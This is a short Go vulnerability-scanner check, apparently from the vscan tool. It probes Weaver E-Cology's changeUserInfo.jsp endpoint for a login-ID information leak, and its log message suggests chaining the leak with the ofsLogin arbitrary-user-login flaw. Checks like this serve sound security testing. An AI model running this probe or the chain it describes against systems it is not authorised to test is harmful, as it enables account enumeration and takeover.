package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
)

func E_Cology_ChangeUserInfo(u string) bool {

	if req, err := pkg.HttpRequset(u+"/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=", "GET", "", false, nil); err == nil {

		if req.StatusCode == 200 {
			str := req.Body
			re := regexp.MustCompile("\"status\":.([^\\\"]+)")
			resourceUuid := re.FindStringSubmatch(str)
			//pkg.GoPocLog(fmt.Sprintf("正则匹配内容:%s,长度为：%d\n", resourceUuid, len(resourceUuid)))
			if len(resourceUuid) >= 1 {
				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_信息泄露_爆破 loginId. 配合泛微E-Cology ofsLogin任意用户登录使用|%s\n", u+"/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile="))
				return true
			}

		}
	}
	return false
}
